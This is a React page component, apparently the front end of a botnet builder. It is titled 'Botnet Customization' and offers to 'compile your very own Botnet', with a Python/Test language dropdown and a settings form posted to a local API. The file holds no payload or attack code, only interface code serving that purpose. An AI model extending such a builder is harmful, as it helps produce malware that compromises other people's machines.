"use client";
import React, { useState } from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { settingsSchema, fields } from "@/lib/schemas/settingsSchema";
import FormComponent from "@/components/custom/FormComponent";
import {
    Card,
    CardContent,
    CardDescription,
    CardFooter,
    CardHeader,
    CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
    DropdownMenu,
    DropdownMenuContent,
    DropdownMenuLabel,
    DropdownMenuRadioGroup,
    DropdownMenuRadioItem,
    DropdownMenuSeparator,
    DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";

/**
 * @issue AddBaseBuilderUIPage 
 * @body Add one page for each language to select the builder UI. Add a dropdown to select the language and a button to navigate to the selected builder UI page. The checkbox Selection should change according to the selected language. 
 */

const Page: React.FC = () => {
    const { register, handleSubmit, formState: { errors } } = useForm({
        resolver: zodResolver(settingsSchema),
        defaultValues: fields,
    });

    const [submittedData, setSubmittedData] = useState<any | null>(null);
    const [liveData, setLiveData] = useState<any>(fields);
    const [selectedLanguage, setSelectedLanguage] = useState<string>("python");

    const onSubmit = async (data: any) => {
        try {
            console.log(data);
            let dataToSend = liveData;
            const response = await fetch('/api/save-settings', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(dataToSend),
            });

            if (!response.ok) {
                console.error('Failed to save settings.');
            } else {
                console.log('Settings saved successfully.');
                setSubmittedData(data);
            }
        } catch (error) {
            console.error('Error:', error);
        }
    };

    return (
        <div className="flex justify-center items-center min-h-screen">
            <Card className="w-[350px]">
                <CardHeader>
                    <CardTitle>Botnet Customization</CardTitle>
                    <CardDescription>Customize and compile your very own Botnet.</CardDescription>
                </CardHeader>
                <CardContent className="grid w-full justify-center items-center gap-4">
                    <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                            <Button variant="outline">{selectedLanguage === "python" ? "Python" : "Test"}</Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent className="w-56">
                            <DropdownMenuLabel>Select Language</DropdownMenuLabel>
                            <DropdownMenuSeparator />
                            <DropdownMenuRadioGroup value={selectedLanguage} onValueChange={setSelectedLanguage}>
                                <DropdownMenuRadioItem value="python">Python</DropdownMenuRadioItem>
                                <DropdownMenuRadioItem value="test">Test</DropdownMenuRadioItem>
                            </DropdownMenuRadioGroup>
                        </DropdownMenuContent>
                    </DropdownMenu>
                    {selectedLanguage === "python" ? (
                        <FormComponent onSubmit={handleSubmit(onSubmit)} liveData={liveData} setLiveData={setLiveData} fields={fields} />
                    ) : (
                        <div>Hello world</div>
                    )}
                </CardContent>
            </Card>
        </div>
    );
};

export default Page;